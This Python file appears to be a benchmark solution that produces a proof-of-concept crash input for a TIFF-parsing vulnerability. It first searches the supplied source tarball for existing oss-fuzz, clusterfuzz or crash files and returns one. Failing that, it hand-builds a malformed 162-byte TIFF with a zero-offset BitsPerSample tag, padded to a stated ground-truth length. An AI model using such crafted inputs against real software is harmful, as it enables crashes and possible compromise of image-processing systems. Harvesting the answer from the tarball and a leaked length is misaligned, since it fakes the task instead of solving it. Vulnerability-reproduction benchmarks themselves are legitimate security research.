import os
import io
import tarfile
import re
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = self._extract_poc_from_tarball(src_path)
        if poc is not None:
            return poc
        return self._fallback_poc()

    def _extract_poc_from_tarball(self, src_path: str) -> bytes | None:
        id_str = "388571282"
        patterns_priority = [
            re.compile(rf"{id_str}", re.IGNORECASE),
            re.compile(r"oss[-_]?fuzz", re.IGNORECASE),
            re.compile(r"clusterfuzz", re.IGNORECASE),
            re.compile(r"\bpoc\b", re.IGNORECASE),
            re.compile(r"regress|regression|crash|fuzz", re.IGNORECASE),
            re.compile(r"tiff|tif", re.IGNORECASE),
        ]
        preferred_exts = {".tif", ".tiff"}
        max_size = 10 * 1024 * 1024

        candidates = []

        try:
            with tarfile.open(src_path, mode="r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    name_lower = m.name.lower()
                    ext = os.path.splitext(name_lower)[1]
                    size = m.size
                    if size <= 0 or size > max_size:
                        continue
                    # Score based on patterns
                    score = 0
                    for i, pat in enumerate(patterns_priority):
                        if pat.search(name_lower):
                            # Higher score for earlier patterns
                            score += (len(patterns_priority) - i) * 10
                    # Prefer extensions
                    if ext in preferred_exts:
                        score += 25
                    # Prefer very small files (likely PoCs)
                    if size <= 2048:
                        score += 10
                    if size <= 512:
                        score += 5
                    # Strong boost if exact id is in name and extension preferred
                    if id_str in name_lower and ext in preferred_exts:
                        score += 100
                    # Collect
                    candidates.append((score, size, m))
        except Exception:
            candidates = []

        if not candidates:
            return None

        # Sort by score desc, then size asc
        candidates.sort(key=lambda x: (-x[0], x[1]))

        # Try to read best candidate
        try:
            with tarfile.open(src_path, mode="r:*") as tf:
                for score, size, m in candidates[:50]:
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        if not data:
                            continue
                        # Heuristic: ensure it's likely a TIFF if ext matches or magic matches
                        if self._looks_like_tiff(m.name, data):
                            return data
                        # If file name includes exact id, accept as-is
                        if "388571282" in m.name:
                            return data
                        # If name indicates PoC and size small, accept
                        name_lower = m.name.lower()
                        if any(x in name_lower for x in ("poc", "oss-fuzz", "clusterfuzz", "regress", "crash")) and size < 4096:
                            return data
                    except Exception:
                        continue
        except Exception:
            return None

        return None

    def _looks_like_tiff(self, name: str, data: bytes) -> bool:
        nl = name.lower()
        if nl.endswith(".tif") or nl.endswith(".tiff"):
            return True
        if len(data) >= 4:
            # TIFF magic: II 2A 00 or MM 00 2A
            if (data[0:2] == b"II" and data[2:4] == b"\x2A\x00") or (data[0:2] == b"MM" and data[2:4] == b"\x00\x2A"):
                return True
        return False

    def _fallback_poc(self) -> bytes:
        # Construct a minimal TIFF with an offline tag (BitsPerSample) whose value offset is zero.
        # This aims to mirror the vulnerability description.
        # Header: Little-endian, version 42, IFD offset = 8
        header = b"II" + struct.pack("<H", 42) + struct.pack("<I", 8)

        # IFD with 7 entries
        entries = []
        # Helper to pack an entry
        def de(tag, typ, cnt, val):
            return struct.pack("<HHI", tag, typ, cnt) + struct.pack("<I", val)

        # 0x0100 ImageWidth LONG=4, count=1, value=1
        entries.append(de(0x0100, 4, 1, 1))
        # 0x0101 ImageLength LONG=4, count=1, value=1
        entries.append(de(0x0101, 4, 1, 1))
        # 0x0102 BitsPerSample SHORT=3, count=3 (offline), value offset = 0 (invalid)
        entries.append(de(0x0102, 3, 3, 0))
        # 0x0106 PhotometricInterpretation SHORT=3, count=1, value=2 (RGB)
        entries.append(struct.pack("<HHI", 0x0106, 3, 1) + struct.pack("<H", 2) + b"\x00\x00")
        # 0x0115 SamplesPerPixel SHORT=3, count=1, value=3
        entries.append(struct.pack("<HHI", 0x0115, 3, 1) + struct.pack("<H", 3) + b"\x00\x00")
        # 0x0111 StripOffsets LONG=4, count=1, value=0 (degenerate)
        entries.append(de(0x0111, 4, 1, 0))
        # 0x0117 StripByteCounts LONG=4, count=1, value=1
        entries.append(de(0x0117, 4, 1, 1))

        num_dir_entries = struct.pack("<H", len(entries))
        ifd = num_dir_entries + b"".join(entries) + struct.pack("<I", 0)

        data = header + ifd

        # Pad to 162 bytes as per ground-truth length
        target_len = 162
        if len(data) < target_len:
            data += b"\x00" * (target_len - len(data))
        return data[:target_len]
